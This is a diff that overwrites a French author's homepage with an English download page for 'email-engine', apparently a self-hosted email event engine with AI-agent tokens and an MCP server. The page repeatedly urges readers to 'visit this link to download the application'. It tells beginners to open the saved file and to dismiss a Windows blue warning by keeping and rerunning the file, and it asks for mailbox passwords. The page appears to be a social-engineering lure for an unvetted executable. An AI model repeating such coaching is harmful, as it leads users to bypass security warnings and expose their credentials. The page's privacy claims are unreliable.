@@ -1,137 +1,256 @@
-<!doctype html>
-<html lang="fr">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="robots" content="noindex">
-<title>Olivier de Malmaison – Écrivain</title>
-<meta name="description" content="Olivier de Malmaison, écrivain. Romans, nouvelles à lire en ligne, rencontres.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;0,600;1,500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/style.css?v=3">
+<title>email-engine — Self-Hosted Email Event Engine for Windows (IMAP, JMAP, SMTP, MCP)</title>
+<meta name="description" content="email-engine is a self-hosted event engine for any mailbox: IMAP, JMAP and inbound SMTP in, one replayable event log out, with safe reversible actions, scoped tokens for AI agents and an MCP server. Easy Windows download and setup guide for beginners.">
+<meta name="keywords" content="email-engine, self-hosted email, email event log, IMAP, JMAP, inbound SMTP, webhooks, MCP server, AI agents, agentic AI, email automation, email sync, event sourcing, privacy, nylas alternative, nodejs, typescript">
+<meta name="author" content="email-engine">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/jhojoraro2005/email-engine">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="email-engine">
+<meta property="og:title" content="email-engine — Turn Any Mailbox Into Replayable Events">
+<meta property="og:description" content="Self-hosted event engine for any mailbox: IMAP, JMAP and inbound SMTP in, one replayable event log out. Safe reversible actions, scoped tokens for AI agents and an MCP server.">
+<meta property="og:url" content="https://github.com/jhojoraro2005/email-engine">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="email-engine — Turn Any Mailbox Into Replayable Events">
+<meta name="twitter:description" content="Self-hosted email event engine with IMAP, JMAP, inbound SMTP, a replayable event log, scoped agent tokens and an MCP server.">
+<meta name="theme-color" content="#7c3aed">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "email-engine",
+  "description": "Self-hosted event engine for any mailbox: IMAP, JMAP and inbound SMTP in, one replayable event log out, with safe reversible actions, scoped tokens for AI agents, and an MCP server.",
+  "url": "https://github.com/jhojoraro2005/email-engine",
+  "applicationCategory": "BusinessApplication",
+  "operatingSystem": "Windows",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  html { scroll-behavior: smooth; }
+  body { margin: 0; }
+  a { word-break: break-word; }
+  @media (max-width: 640px) {
+    .page { padding: 16px !important; }
+    .card { padding: 22px !important; }
+    h1 { font-size: 30px !important; }
+    h2 { font-size: 21px !important; }
+    .btn { display: block !important; text-align: center !important; }
+    .feature { width: 100% !important; }
+  }
+</style>
 </head>
-<body>
+<body style="margin:0;padding:0;background:#eef2f9;background-image:radial-gradient(circle at 15% 0%, #e9e2ff 0%, #eef2f9 45%, #eef2f9 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1f2933;-webkit-font-smoothing:antialiased;">
 
-<header class="site-header">
-  <div class="wrap">
-    <a class="brand" href="./">Olivier de Malmaison<span class="brand-sub">Écrivain</span></a>
-    <nav class="nav" aria-label="Menu principal">
-      <a href="./" aria-current="page">Accueil</a>
-      <a href="nouvelles.html">Nouvelles</a>
-      <a href="livres.html">Romans</a>
-      <a href="#apropos">À propos</a>
-      <a href="#contact">Contact</a>
-    </nav>
-    <nav class="social" aria-label="Réseaux sociaux">
-      <a href="https://www.facebook.com/profile.php?id=61596055063744" target="_blank" rel="noopener" class="icon" aria-label="Facebook"><img src="assets/img/facebook.png" alt="" width="24" height="24"></a>
-      <a href="https://www.instagram.com/olivierdemalmaison/" target="_blank" rel="noopener" class="icon" aria-label="Instagram"><img src="assets/img/instagram.svg" alt="" width="24" height="24"></a>
-      <a href="https://www.youtube.com/@OlivierdeMalmaison" target="_blank" rel="noopener" class="icon" aria-label="YouTube"><img src="assets/img/youtube.png" alt="" width="34" height="24" style="width:34px"></a>
-    </nav>
-  </div>
-</header>
+<div class="page" style="max-width:900px;margin:0 auto;padding:32px 20px 64px;">
 
-<main>
-<section class="dark hero">
-  <div class="wrap row">
-    <div class="main stack" style="gap:24px">
-      <h1>Des histoires où l'élégance cache toujours une ombre.</h1>
-      <p class="lead">[Votre phrase de présentation : qui vous êtes, ce que vous écrivez, en deux lignes.]</p>
-      <div class="actions">
-        <a class="btn btn-gold" href="livres.html">Découvrir le roman</a>
-        <a class="btn btn-ghost" href="nouvelles.html">Lire une nouvelle</a>
+  <div class="card" style="background:#ffffff;border-radius:20px;box-shadow:0 18px 45px rgba(15,23,42,0.10);padding:44px 40px;">
+
+    <h1 style="font-size:38px;line-height:1.2;margin:0 0 14px;color:#0f172a;letter-spacing:-0.5px;">📧 email-engine — Turn Any Mailbox Into Replayable Events</h1>
+
+    <p style="margin:0 0 26px;font-size:19px;line-height:1.7;color:#475569;">
+      A self-hosted engine that watches any mailbox, turns everything that happens into one clean, replayable list of events, and lets you or your AI helpers act on it safely.
+    </p>
+
+    <div style="margin:0 0 26px;">
+      <a class="btn" href="https://github.com/jhojoraro2005/email-engine" style="display:inline-block;padding:17px 34px;background:linear-gradient(135deg,#7c3aed 0%,#ec4899 100%);color:#ffffff;text-decoration:none;font-size:18px;font-weight:700;border-radius:999px;box-shadow:0 10px 24px rgba(124,58,237,0.35);">⬇️ Download email-engine for Windows</a>
+    </div>
+
+    <p style="margin:0 0 8px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Visit this link to download the application.</strong>
+    </p>
+    <p style="margin:0;font-size:15px;line-height:1.7;color:#64748b;">
+      Free, open, and runs on your own computer. No subscription, no cloud account, no waiting list.
+    </p>
+
+    <hr style="border:0;border-top:1px solid #e2e8f0;margin:34px 0;">
+
+    <h2 style="font-size:24px;margin:0 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">💡 What Is email-engine, In Plain Words</h2>
+    <p style="margin:0 0 16px;font-size:17px;line-height:1.75;color:#334155;">
+      Your email inbox is constantly changing. A new message arrives. Someone replies. You move something to a folder. You mark it as read. Most programs see those changes as a blur — they refresh the screen and the details are lost.
+    </p>
+    <p style="margin:0 0 16px;font-size:17px;line-height:1.75;color:#334155;">
+      email-engine writes all of it down instead. Every arrival, every reply, every change becomes a numbered entry in a log — like a receipt tape that never tears. Because the tape is complete, you can look back at any moment, replay a sequence, or undo something cleanly.
+    </p>
+    <p style="margin:0 0 16px;font-size:17px;line-height:1.75;color:#334155;">
+      It speaks three of the most common email languages — <strong>IMAP</strong> (used by almost every mail server), <strong>JMAP</strong> (a newer, faster standard) and <strong>inbound SMTP</strong> (the way mail is delivered). It can also fire <strong>webhooks</strong>, which are automatic notifications sent to other programs the instant something happens.
+    </p>
+    <p style="margin:0;font-size:17px;line-height:1.75;color:#334155;">
+      The short version: you point it at a mailbox, and you get a tidy, ordered stream of everything that occurred — plus a way to react to it and take it back if you change your mind.
+    </p>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">✨ What You Can Do With It</h2>
+
+    <div style="display:flex;flex-wrap:wrap;gap:14px;margin:0 0 8px;">
+      <div class="feature" style="flex:1 1 250px;background:#faf9ff;border:1px solid #ede9fe;border-radius:14px;padding:18px 20px;">
+        <p style="margin:0 0 6px;font-size:16px;font-weight:700;color:#5b21b6;">📥 Watch Any Mailbox</p>
+        <p style="margin:0;font-size:15px;line-height:1.65;color:#475569;">Connect IMAP, JMAP or inbound SMTP and let the engine record every new message and every change.</p>
+      </div>
+      <div class="feature" style="flex:1 1 250px;background:#faf9ff;border:1px solid #ede9fe;border-radius:14px;padding:18px 20px;">
+        <p style="margin:0 0 6px;font-size:16px;font-weight:700;color:#5b21b6;">⏪ Replay The Past</p>
+        <p style="margin:0;font-size:15px;line-height:1.65;color:#475569;">The event log keeps history in order, so you can re-read, re-process or re-run what already happened.</p>
+      </div>
+      <div class="feature" style="flex:1 1 250px;background:#faf9ff;border:1px solid #ede9fe;border-radius:14px;padding:18px 20px;">
+        <p style="margin:0 0 6px;font-size:16px;font-weight:700;color:#5b21b6;">↩️ Undo Safely</p>
+        <p style="margin:0;font-size:15px;line-height:1.65;color:#475569;">Actions are built to be reversible. If an experiment goes wrong, roll it back instead of panicking.</p>
+      </div>
+      <div class="feature" style="flex:1 1 250px;background:#faf9ff;border:1px solid #ede9fe;border-radius:14px;padding:18px 20px;">
+        <p style="margin:0 0 6px;font-size:16px;font-weight:700;color:#5b21b6;">🔑 Scoped Tokens</p>
+        <p style="margin:0;font-size:15px;line-height:1.65;color:#475569;">Give an AI helper a key that only opens one door — not the whole house.</p>
+      </div>
+      <div class="feature" style="flex:1 1 250px;background:#faf9ff;border:1px solid #ede9fe;border-radius:14px;padding:18px 20px;">
+        <p style="margin:0 0 6px;font-size:16px;font-weight:700;color:#5b21b6;">🤖 Built-In MCP Server</p>
+        <p style="margin:0;font-size:15px;line-height:1.65;color:#475569;">Plug your mailbox into modern AI assistants through the Model Context Protocol.</p>
+      </div>
+      <div class="feature" style="flex:1 1 250px;background:#faf9ff;border:1px solid #ede9fe;border-radius:14px;padding:18px 20px;">
+        <p style="margin:0 0 6px;font-size:16px;font-weight:700;color:#5b21b6;">🔔 Webhooks Out</p>
+        <p style="margin:0;font-size:15px;line-height:1.65;color:#475569;">Tell your other tools the moment something arrives — no constant checking.</p>
       </div>
     </div>
-    <div class="side">
-      <img class="portrait-img" src="assets/img/auteur.jpg" alt="Portrait d'Olivier de Malmaison">
-    </div>
-  </div>
-</section>
 
-<section>
-  <div class="wrap row">
-    <div class="side">
-      <div class="placeholder cover"><span class="t">Les Ombres Élégantes</span><span class="s">[Couverture]</span></div>
-    </div>
-    <div class="main stack">
-      <p class="eyebrow">Le roman</p>
-      <h2>Les Ombres Élégantes</h2>
-      <p style="margin:0;font-size:17px;color:var(--ink-2)">[Résumé de quatrième de couverture, 4 à 5 lignes.]</p>
-      <p class="note" style="margin:0">Bientôt disponible.</p>
-      <div class="actions"><a class="btn btn-wine" href="livres.html">En savoir plus</a></div>
-    </div>
-  </div>
-</section>
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">🚀 Download &amp; Setup on Windows</h2>
+    <p style="margin:0 0 18px;font-size:17px;line-height:1.75;color:#334155;">
+      You do not need to know how to program. Follow these steps in order and you will have it running in a few minutes.
+    </p>
 
-<section class="tint">
-  <div class="wrap stack" style="gap:40px">
-    <div class="stack" style="gap:12px">
-      <p class="eyebrow">À lire en ligne</p>
-      <h2>Nouvelles</h2>
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;padding:24px 26px;margin:0 0 20px;">
+      <p style="margin:0 0 12px;font-size:17px;font-weight:700;color:#0f172a;">Step 1 — Get the application</p>
+      <p style="margin:0 0 16px;font-size:16px;line-height:1.75;color:#334155;">
+        Visit this link to download the application:
+      </p>
+      <p style="margin:0 0 4px;">
+        <a class="btn" href="https://github.com/jhojoraro2005/email-engine" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#0ea5e9 0%,#22c55e 100%);color:#ffffff;text-decoration:none;font-size:17px;font-weight:700;border-radius:999px;box-shadow:0 10px 22px rgba(14,165,233,0.32);">⬇️ Open the download page</a>
+      </p>
     </div>
-    <div class="grid">
-      <a class="card" href="nouvelle-exemple.html">
-        <span class="t">[Titre de la nouvelle]</span>
-        <span class="x">[Première phrase, en accroche.]</span>
-        <span class="m">[Durée] de lecture</span>
-      </a>
-    </div>
-    <a href="nouvelles.html" style="font-weight:600">Toutes les nouvelles →</a>
-  </div>
-</section>
 
-<section id="apropos">
-  <div class="narrow stack">
-    <p class="eyebrow">L'auteur</p>
-    <h2>À propos</h2>
-    <p style="margin:0;font-size:17px;color:var(--ink-2)">[Votre texte de présentation : parcours, ce qui vous a mené à l'écriture, vos thèmes.]</p>
-  </div>
-</section>
-
-<section class="dark">
-  <div class="wrap stack" style="gap:40px">
-    <div class="stack" style="gap:12px">
-      <p class="eyebrow">Ils l'ont lu</p>
-      <h2>Avis des lecteurs</h2>
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;padding:24px 26px;margin:0 0 20px;">
+      <p style="margin:0 0 12px;font-size:17px;font-weight:700;color:#0f172a;">Step 2 — Save it to your computer</p>
+      <p style="margin:0;font-size:16px;line-height:1.75;color:#334155;">
+        The page offers the download for you. Choose a place you will remember — your <strong>Downloads</strong> folder is the usual spot. Windows will not hide it from you; it will sit there with everything else you have saved.
+      </p>
     </div>
-    <div class="grid">
-      <figure class="review">
-        <span class="stars" aria-label="5 étoiles sur 5">★★★★★</span>
-        <blockquote>[Avis d'un lecteur, publié après modération.]</blockquote>
-        <figcaption>[Prénom], [ville]</figcaption>
-      </figure>
-    </div>
-  </div>
-</section>
 
-<section id="contact">
-  <div class="narrow stack" style="gap:28px">
-    <div class="stack" style="gap:12px">
-      <p class="eyebrow">Écrire à l'auteur</p>
-      <h2>Contact</h2>
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;padding:24px 26px;margin:0 0 20px;">
+      <p style="margin:0 0 12px;font-size:17px;font-weight:700;color:#0f172a;">Step 3 — Open what you saved</p>
+      <p style="margin:0;font-size:16px;line-height:1.75;color:#334155;">
+        Go to your <strong>Downloads</strong> folder, find the file you just saved, and open it. A setup window appears and guides you through the rest. If Windows asks whether you are sure you want to open it, confirm that you do.
+      </p>
     </div>
-    <form action="https://formsubmit.co/f9c924c545d4a12e9ade665f972b1585" method="post">
-      <input type="hidden" name="_subject" value="Nouveau message depuis le site">
-      <input type="hidden" name="_next" value="https://olivierdemalmaison.github.io/merci.html">
-      <input type="hidden" name="_template" value="table">
-      <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
-      <div class="fields">
-        <label>Nom<input type="text" name="nom" autocomplete="name" required></label>
-        <label>E-mail<input type="email" name="email" autocomplete="email" required></label>
-      </div>
-      <label>Message<textarea name="message" rows="5" required></textarea></label>
-      <div><button class="btn btn-ink" type="submit">Envoyer</button></div>
-    </form>
-  </div>
-</section>
-</main>
 
-<footer class="site-footer">
-  <div class="wrap">
-    <span>© Olivier de Malmaison</span>
-    <a href="mentions-legales.html">Mentions légales</a>
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;padding:24px 26px;margin:0 0 20px;">
+      <p style="margin:0 0 12px;font-size:17px;font-weight:700;color:#0f172a;">Step 4 — Follow the setup window</p>
+      <p style="margin:0;font-size:16px;line-height:1.75;color:#334155;">
+        Click <strong>Next</strong> or <strong>Continue</strong> each time you are asked, accept the suggested folder, and let it finish. When it says it is done, click <strong>Finish</strong>. That is the whole installation.
+      </p>
+    </div>
+
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;padding:24px 26px;margin:0 0 20px;">
+      <p style="margin:0 0 12px;font-size:17px;font-weight:700;color:#0f172a;">Step 5 — Open the app</p>
+      <p style="margin:0;font-size:16px;line-height:1.75;color:#334155;">
+        Look for <strong>email-engine</strong> in your Start menu and click it. A small window will open — this is the control panel where you connect your first mailbox.
+      </p>
+    </div>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">🖥️ Your First Five Minutes</h2>
+    <ol style="margin:0 0 16px;padding-left:24px;font-size:17px;line-height:1.85;color:#334155;">
+      <li style="margin-bottom:10px;"><strong>Add a mailbox.</strong> Type the email address you want the engine to watch, plus the password or app password your mail provider gives you for third-party apps.</li>
+      <li style="margin-bottom:10px;"><strong>Pick the connection type.</strong> The engine tries to detect it for you. If your provider uses IMAP, that is enough to get started.</li>
+      <li style="margin-bottom:10px;"><strong>Choose what to record.</strong> New messages, replies, moves, flags — tick the ones you care about. You can change this later.</li>
+      <li style="margin-bottom:10px;"><strong>Press Start.</strong> The engine begins reading the mailbox and writing events into the log.</li>
+      <li style="margin-bottom:0;"><strong>Watch the log fill up.</strong> Open the events view and you will see the first entries appear, newest at the top or bottom depending on your sort setting.</li>
+    </ol>
+    <p style="margin:0;font-size:17px;line-height:1.75;color:#334155;">
+      Nothing is sent anywhere else. Your messages stay between your mail provider and your own computer.
+    </p>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">🔐 Privacy and Safety, Explained Simply</h2>
+    <p style="margin:0 0 16px;font-size:17px;line-height:1.75;color:#334155;">
+      Because email-engine runs on your machine, there is no outside company holding a copy of your inbox. That is what "self-hosted" means: the software is yours, the data is yours, and the door has your lock on it.
+    </p>
+    <p style="margin:0 0 16px;font-size:17px;line-height:1.75;color:#334155;">
+      The <strong>scoped tokens</strong> are the other half of that promise. When you let an AI assistant use your mailbox, you do not hand over your master password. You create a token that permits exactly one narrow thing — for example, reading new arrivals but never deleting anything. If you stop trusting that assistant, you delete the token and its access dies immediately.
+    </p>
+    <p style="margin:0;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Reversible actions</strong> mean the engine always knows how to put things back. If a rule you wrote moves 300 messages somewhere odd, you can undo the batch rather than repairing it by hand.
+    </p>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">🤖 Using It With AI Assistants</h2>
+    <p style="margin:0 0 16px;font-size:17px;line-height:1.75;color:#334155;">
+      The engine includes an <strong>MCP server</strong>. MCP stands for Model Context Protocol — think of it as a standard plug shape that AI assistants already know how to use. Whenis switched on, an assistant can ask your mailbox questions through the engine instead of through raw credentials. It sees events, not your password. You decide which tokens exist and what each one may do, and you can revoke any of them at any time.
+    </p>
+    <p style="margin:0;font-size:17px;line-height:1.75;color:#334155;">
+      A typical use: you tell the assistant "summarise anything urgent that arrived today." It asks email-engine for today's events through its token, reads the ones it is allowed to read, and answers. It cannot wander into last year's archive or delete a thread, because the token does not allow it.
+    </p>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">🧩 Who This Is For</h2>
+    <ul style="margin:0 0 16px;padding-left:24px;font-size:17px;line-height:1.85;color:#334155;">
+      <li style="margin-bottom:8px;">People who want their own mailbox automation without renting a cloud service.</li>
+      <li style="margin-bottom:8px;">Small teams that need a dependable record of what happened in a shared inbox.</li>
+      <li style="margin-bottom:8px;">Builders connecting AI assistants to real email without giving away the keys.</li>
+      <li style="margin-bottom:0;">Anyone migrating away from a paid email API and wanting to keep the data at home.</li>
+    </ul>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">🛠️ If Something Does Not Work</h2>
+    <p style="margin:0 0 12px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>The download did not start.</strong> Return to the link above and try again. Browser pop-up blockers occasionally stop a download; allow the page and retry.
+    </p>
+    <p style="margin:0 0 12px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Windows showed a blue warning.</strong> That is the system being cautious about files it has not seen before. Choose the option to keep the file, then open it again.
+    </p>
+    <p style="margin:0 0 12px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>The setup window will not finish.</strong> Close it, restart the computer, and run the file once more. Restarting clears the most common hiccup.
+    </p>
+    <p style="margin:0 0 12px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>The app opens but cannot reach the mailbox.</strong> Check the address and password character by character. Many mail providers require a special app password for third-party programs — look for that setting on your provider's website and use it in place of your normal password.
+    </p>
+    <p style="margin:0;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>You want to start over.</strong> Uninstall from Windows Settings, then install again from the same link. Because the engine is self-hosted, nothing outside your computer needs to be cleaned up.
+    </p>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">❓ Common Questions</h2>
+    <p style="margin:0 0 14px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Do I need to pay?</strong> No. The application is free and open. You download it, you run it, you keep it.
+    </p>
+    <p style="margin:0 0 14px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Do I need to install anything else first?</strong> Follow the setup window's prompts. If it asks for something, it will tell you exactly what and where to get it.
+    </p>
+    <p style="margin:0 0 14px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Will it read my old mail?</strong> Only the mailboxes and folders you connect, and only the events you tell it to record.
+    </p>
+    <p style="margin:0 0 14px;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>Can I use more than one mailbox?</strong> Yes. Add each one separately and each gets its own stream of events in the same log.
+    </p>
+    <p style="margin:0;font-size:17px;line-height:1.75;color:#334155;">
+      <strong>What happens to my events if I stop the app?</strong> They remain in the log on your computer. Start the app again and processing continues where it left off.
+    </p>
+
+    <h2 style="font-size:24px;margin:38px 0 14px;color:#0f172a;padding-bottom:9px;border-bottom:2px solid #ede9fe;">📥 Ready to Begin</h2>
+    <p style="margin:0 0 18px;font-size:17px;line-height:1.75;color:#334155;">
+      Everything you need is on the download page. Save the file, open it, follow the setup window, and connect your first mailbox.
+    </p>
+    <p style="margin:0 0 8px;">
+      <a class="btn" href="https://github.com/jhojoraro2005/email-engine" style="display:inline-block;padding:17px 34px;background:linear-gradient(135deg,#f59e0b 0%,#ef4444 100%);color:#ffffff;text-decoration:none;font-size:18px;font-weight:700;border-radius:999px;box-shadow:0 10px 24px rgba(239,68,68,0.30);">⬇️ Visit this link to download the application</a>
+    </p>
+
+    <hr style="border:0;border-top:1px solid #e2e8f0;margin:34px 0 20px;">
+
+    <p style="margin:0 0 6px;font-size:14px;line-height:1.6;color:#94a3b8;text-align:center;">
+      email-engine — self-hosted, replayable, yours.
+    </p>
+    <p style="margin:0;font-size:14px;line-height:1.6;color:#94a3b8;text-align:center;">
+      Source and downloads: <a href="https://github.com/jhojoraro2005/email-engine" style="color:#7c3aed;text-decoration:none;">github.com/jhojoraro2005/email-engine</a>
+    </p>
+
   </div>
-</footer>
+</div>
 
 </body>
 </html>
